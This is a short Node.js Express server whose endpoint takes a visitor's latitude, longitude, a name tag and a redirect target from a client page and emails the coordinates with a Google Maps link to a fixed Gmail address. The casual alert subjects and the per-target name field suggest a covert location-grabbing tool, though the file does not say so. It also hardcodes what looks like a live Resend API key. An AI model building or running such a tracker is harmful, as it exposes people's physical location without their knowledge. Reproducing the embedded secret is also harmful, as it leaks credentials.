const express = require('express');
const path = require('path');
const app = express();
const port = process.env.PORT || 5000;
const { Resend } = require('resend');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/', (req, res) => {
    return res.sendFile(path.resolve('./public/index.html'));
});

app.post('/api/notify', (req, res) => {
    const { latitude, longitude, error, queryName, redirectTo } = req.body;
    console.log(queryName);

    if (error) {
        sendEmail({ title: 'Error in notification', body: 'Error in notification', user: queryName || "" });
        console.log('Error in notification');
        return res.send('Error in notification');
    }

    sendEmail({
        title: 'Aa gaya bhai',
        body: `latitude is: ${latitude} <br> longitude is: ${longitude}
        <a href="https://www.google.com/maps?q=${latitude},${longitude}">open maps</a>`,
        user: queryName || ""
    });
    return res.send('Notification received');
});

const server = app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

process.on('SIGTERM', () => {
    console.log('SIGTERM signal received: closing HTTP server');
    server.close(() => {
        console.log('HTTP server closed');
    });
});

async function sendEmail({ title, body, user }) {
    const resend = new Resend('re_FVV2rZjE_JcWWZxg3FmB7ocvwBVw5iMUk');
    console.log('Sending email');
    const { data, error } = await resend.emails.send({
        from: 'Chhotu kalu<onboarding@resend.dev>',
        to: ['comeingame72@gmail.com'],
        subject: 'Oh Akram Great',
        html: `
          <h1>${title}</h1>
          <p>${body}</p>
          <p>User: ${user}</p>`
    });

    if (error) {
        return console.error({ error });
    }

    console.log({ data });
}
